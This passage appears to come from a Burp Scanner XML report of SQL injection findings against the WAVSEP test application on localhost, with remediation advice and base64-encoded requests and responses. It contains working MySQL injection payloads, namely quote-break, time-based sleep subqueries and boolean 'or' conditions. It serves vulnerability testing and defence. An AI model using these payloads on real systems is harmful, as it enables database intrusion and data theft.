    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcD9vcmRlcmJ5PW1zZ2lkJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcD9vcmRlcmJ5PW1zZ2lkJTJjKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8444750016566885376</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the transactionId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>84355502 or 5174=05174</b> and <b>61471666 or 3801=3803</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzInIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkxNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsgQU5EIHVzZXJJZD0xJiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzI4NDM1NTUwMiUyMG9yJTIwNTE3NCUzZDA1MTc0IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzI2MTQ3MTY2NiUyMG9yJTIwMzgwMSUzZDM4MDMgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
